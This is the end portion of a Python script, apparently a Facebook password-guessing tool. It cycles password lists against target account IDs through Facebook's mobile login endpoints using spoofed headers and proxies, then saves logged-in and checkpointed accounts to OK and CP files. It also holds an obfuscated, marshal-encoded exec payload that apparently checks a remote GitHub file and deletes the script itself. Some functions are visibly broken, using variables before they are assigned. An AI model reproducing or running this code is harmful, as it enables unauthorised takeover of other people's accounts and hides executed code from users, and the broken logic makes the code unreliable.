			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[GURUNG-DW]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				ok.append(wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#

_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x00\x00\x00\x10r\x0b\x01\x07\x00\xf0\x0b\x01\x07\x00\xf0\x0b\x01\x07\x00\xf0\x0b\x01\x07\x00\xf0\x0b\x01\x07\x02\xf0\x01\x01\x01\x03\xf0\x00\x00\x00\x1es\x00\x00\x00\x01\x00\x00\x00\x12r>eludom<\x08\xfa\x00\x00\x00\x0er\x00\x00\x00\x10r\x00\xa9\x00\x00\x00\x0fr\x01)N\x00\x00\x00\x00\xf3d\x80\n\x06\xd8\x13\x02\xd0\x13\x02\xd0\x13\x02\xd0\x13\x02\xd4\x13\x02\xd1F\x88)\x82)\x87\x04\x02\xdd\x15\x02\xd0\x15\x02\xd4\x15\x02\xd1H\x8d)\x82)\x87\x04\x02\xdd\x1c\x02\xd0\x1c\x02\xd4\x1c\x02\xd1\x1b\x08\xd0\x07\x02\xdd\x1e\x04\xd0\x1e\x04\xd0\x1d\x94\x18\x90\r\x04\xd8\x18\x80\x1d\x0c\xd4\x1d\x0c\xd1\x13\x98L\x8aL\x8f\x14\x0c\xdd\x13\x80F\x07\xd8\x00\x80\x00\x00\x00cs\x00\x00\x00\x01\x00\x00\x00\x0frsed\x03\xda>x<\x03\xfa  \x00\x00\x00\x02sesnopser\x08\xdalru\x03\xda\x02)metsys\x06\xda__elif__\x08\xdaevomer\x06\xdaso\x02\xdatnirp\x05\xdatxet\x04\xdateg\x03\xdastseuqer\x08\xda\x08)tixe\x04\xdaGNIYORTSED ]\xa2\x80\xe2[ \x00\x00\x00\x11uyortsed\x07\xdatxt.lavorppa/niam/bolb/lavorppa/DX-yyyrrah/moc.buhtig//:sptth=zN\x05)\x00S\x00d\x00S\x00d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x04d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08t\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0ct\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08t\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x03d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07tJr\x00v\x00\x00\x00\x00\x00\x00\x00\x00\x02j\x01|\x02d\x01}\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x00}\x01d\x00\x97\x00\x00\x00\xe4\xf3\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c\x02)\x00S\x01d\x00Z\x00\x84\x00d\x00\x97\x00\x00\x00\x0c\xf3\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	des()
	login()


#LOTS OF LOVE FROM GURUNG🌺
